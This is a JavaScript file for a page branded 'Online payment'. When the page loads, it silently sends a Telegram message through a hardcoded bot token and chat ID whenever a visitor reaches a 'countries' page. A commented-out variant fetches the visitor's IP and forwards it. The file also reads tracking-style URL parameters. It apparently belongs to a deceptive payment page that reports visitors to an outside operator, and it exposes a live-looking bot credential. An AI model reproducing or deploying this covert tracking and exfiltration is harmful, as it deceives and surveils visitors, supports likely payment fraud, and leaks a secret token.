const createNav = () => {
    function notifyTelegram(message) {
        const botToken = '7246354262:AAHntXSjinje1yphb59Tua15AwyAjVUOZPU'; // ⚠️ НЕБЕЗОПАСНО!
        const chatId = '7559611229';

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
            method: 'GET'
        })
        .then(response => response.json())
    }


    let nav = document.querySelector('.navbar');
    
    // if (location.href.includes('countries')) {
    //     fetch('https://api.ipify.org?format=json')
    //     .then(res => res.json())
    //     .then(data => notifyTelegram(`🌐 IP: ${data.ip} ▶️ Зашёл на страницу выбора стран`));
    // }

    if (location.href.includes('countries')) {
        notifyTelegram(`🌐 IP: 000 ▶️ Зашёл на страницу выбора стран`)
    }

    nav.innerHTML = `
        <nav class="bg-white border-b border-gray-200">
          <div class="container mx-auto px-4">
            <div class="flex items-center h-16">
              <h1 class="text-2xl font-['Pacifico'] text-primary">
                Online payment
              </h1>
            </div>
          </div>
        </nav>
    `;

    const params = Object.fromEntries(new URLSearchParams(window.location.href.substring(window.location.href.lastIndexOf('?')+1)).entries());
    console.log(params) // {one: '1', two: '2'}
    console.log(params.a)
    console.log(params.u)
}

createNav();